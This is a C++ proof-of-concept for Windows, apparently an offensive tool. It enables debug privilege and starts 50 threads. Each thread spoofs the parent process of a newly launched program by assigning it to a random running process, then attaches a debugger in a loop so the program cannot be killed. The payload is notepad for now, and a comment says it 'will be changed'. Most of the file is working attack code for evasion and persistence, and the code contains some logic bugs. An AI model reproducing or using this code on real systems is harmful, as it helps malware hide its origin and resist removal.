// DebugPoC.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#define MAX_THREADS 50

//helper function that goes through the processes and returns an array of all the 
//PIDs of all the process that are on a system
std::vector<DWORD> EnumProcs()
{
	std::vector<DWORD> pidlist;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
		if (Process32First(snapshot, &pe32))
		{
			do
			{
				//We cant spawn under System and System Interupts processes
				//there are a few more but the PIDs are going to change
				//these two do not
				if (pe32.th32ProcessID != 4 || pe32.th32DefaultHeapID != 0) {
					pidlist.push_back(pe32.th32ProcessID);
				}
			} while (Process32Next(snapshot, &pe32));
		}
		CloseHandle(snapshot);
	}
	return pidlist;
}

//Enables our current process to have debug privleges, so we can spawn proccesses under other processes
BOOL CurrentProcessAdjustToken(void)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES sTP;

	//grab our current processes token
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{	
		//lookup the luid of a specified priv and add it to our TOKEN_PRIVLIGES var
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sTP.Privileges[0].Luid))
		{
			CloseHandle(hToken);
			return FALSE;
		}

		//make sure the priv is enabled
		sTP.PrivilegeCount = 1;
		sTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		//update the privs
		if (!AdjustTokenPrivileges(hToken, 0, &sTP, sizeof(sTP), NULL, NULL))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		CloseHandle(hToken);
		return TRUE;
	}
	return FALSE;
}

// Our main thread function that performs the process spawning
DWORD WINAPI swarm_thread( LPVOID threadparam )
{

	//important vars for process creation
	STARTUPINFOEXW si; //extended startup info
	PROCESS_INFORMATION pi;
	SIZE_T AttributeListSize;

	//init the extended startup info
	ZeroMemory(&si, sizeof(si));

	//Initializes the specified list of attributes for process and thread creation.
	InitializeProcThreadAttributeList(NULL, 1, 0, &AttributeListSize);

	
	si.StartupInfo.cb = sizeof(si);

	//another necessary init function for the the attribute list
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		0,
		AttributeListSize
	);

	//another necessary init function for the attribute list
	InitializeProcThreadAttributeList(si.lpAttributeList,
		1,
		0,
		&AttributeListSize);

	CurrentProcessAdjustToken();

	//grab a PID for a process
	std::vector<DWORD> proclist = EnumProcs();

	//here we are generating a random number to grab out of the array(vector) of pids
	unsigned int time_ui = unsigned int(time(NULL));
	srand(time_ui);

	size_t randproc = rand() % proclist.size();
	wprintf(L"Spawning Process at PID: %d\n", proclist.at(randproc));

	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, proclist.at(randproc));

	//here is the money
	//using PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, we can actually pass this function
	//a handle to a process that it will then spawn our process under when we call
	//CreateProcess() and it will inherit the privs (i need to look into this)
	if (UpdateProcThreadAttribute(si.lpAttributeList,
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		&proc,
		sizeof(proc),
		NULL,
		NULL) == FALSE){
		return -1;
	}


	ZeroMemory(&pi, sizeof(pi));

	//this will be changed
	//notepad is used just for example :)
	LPTSTR szCmdline = _tcsdup(TEXT("C:\\Windows\\System32\\notepad.exe"));

	//create the process using the extended startup info, note the custom flag
	//EXTENDED_STARTUPINFO_PRESENT. This is vital so windows knows to look for that
	//extra info
	CreateProcess(NULL,
		szCmdline,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&si.StartupInfo,
		&pi);

	while (1) {
		//This forces our program to start debugging the process we just spawned. When you do this,
		//the process becomes unkillable (unless you are SYSTEM)
		DebugActiveProcess(pi.dwProcessId);
		Sleep(1000);
	}
	return 0;
}

/*
Entry point for the program. Spawns the threads that will then spawn 
processes at a random process on the system
*/
int main()
{

	//important vars for threads
	DWORD dwThreadIdArray[MAX_THREADS];
	HANDLE hThreadArray[MAX_THREADS];

	//loop to create threads
	for (int i = 0; i < MAX_THREADS; i++) {

		//create the threads
		hThreadArray[i] = CreateThread(
			NULL, //security attributes
			0, //default stack size
			swarm_thread, //function
			NULL, //args
			0, //default creation flags
			&dwThreadIdArray[i]); //thread array

		//sleep so random seed works
		Sleep(100);
	}

	//wait for the threads to finish
	//not really needed in our case but just for neatness sake
	WaitForMultipleObjects(MAX_THREADS, hThreadArray, TRUE, INFINITE);

	//cleanup the threads
	//again, probably wont reach this point but oh well
	for (int i = 0; i < MAX_THREADS; i++) {
		CloseHandle(hThreadArray);
	}

	return 0;

}
